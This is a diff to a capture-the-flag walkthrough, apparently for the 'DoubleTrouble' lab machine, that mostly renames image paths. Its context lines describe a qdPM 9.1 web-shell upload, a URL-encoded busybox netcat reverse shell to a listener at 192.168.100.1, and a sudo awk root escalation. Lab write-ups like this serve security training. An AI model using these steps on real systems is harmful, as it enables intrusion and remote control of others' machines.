@@ -67,7 +67,7 @@ Nmap done: 1 IP address (1 host up) scanned in 36.66 seconds
 
 Browsing to port 80 revealed a login page for **qdPM version 9.1**, a web-based project management tool.
 
-![](machines/DoubleTrouble/image.png)
+![](images/img.png)
 
 The application displayed a clear version number (qdPM 9.1), which became critical for identifying known vulnerabilities.
 
@@ -116,7 +116,7 @@ The most interesting discovery was the **`/secret`** directory, which warranted 
 
 Accessing the `/secret` directory revealed directory listing was enabled, exposing a JPEG file named `doubletrouble.jpg`.
 
-![](image-1.png)
+![](images/img-1.png)
 
 The file was downloaded for offline analysis to check for hidden data.
 
@@ -193,7 +193,7 @@ o[REDACTED]
 
 Using the discovered credentials, successful authentication to the qdPM application was achieved.
 
-![](image-2.png)
+![](images/img-2.png)
 
 After logging in, the dashboard confirmed we were operating as the user `otisrush`.
 
@@ -208,13 +208,13 @@ A remote code execution (RCE) vulnerability exists in qdPM 9.1 and earlier versi
 
 The "My Account" settings page was accessed to locate the photo upload functionality.
 
-![](image-3.png)
+![](images/img-3.png)
 
 #### Creating a Web Shell
 
 A simple PHP web shell was created to execute arbitrary system commands:
 
-![](image-4.png)
+![](images/img-4.png)
 
 This payload was uploaded through the Photo field in the profile settings.
 
@@ -222,17 +222,17 @@ This payload was uploaded through the Photo field in the profile settings.
 
 Directory listing was enabled on the `/uploads` directory, allowing direct browsing of uploaded files.
 
-![](image-5.png)
+![](images/img-5.png)
 
 Navigating to the `users` subdirectory revealed the uploaded PHP file.
 
-![](image-6.png)
+![](images/img-6.png)
 
 #### Achieving Remote Code Execution
 
 The web shell was successfully accessed and command execution was verified.
 
-![](image-7.png)
+![](images/img-7.png)
 
 The shell was functional and capable of executing system commands via the `cmd` parameter.
 
@@ -253,7 +253,7 @@ listening on [any] 4444 ...
 busybox%20nc%20192.168.100.1%204444%20-e%20%2Fbin%2Fbash
 ```
 
-![](image-8.png)
+![](images/img-8.png)
 
 **Connection received:**
 
@@ -338,7 +338,7 @@ User www-data may run the following commands on doubletrouble:
 
 The `www-data` user could execute `/usr/bin/awk` as root without a password. Consulting [GTFOBins](https://gtfobins.org/gtfobins/awk/) provided the exploitation technique.
 
-![](image-9.png)
+![](images/img-9.png)
 
 **Exploitation:**
 
@@ -445,7 +445,7 @@ The service versions indicated this was running an older Debian 7 system.
 
 Browsing to port 80 revealed a simple custom login form.
 
-![](image-10.png)
+![](images/img-10.png)
 
 This custom application appeared to be a prime candidate for SQL injection testing.
 
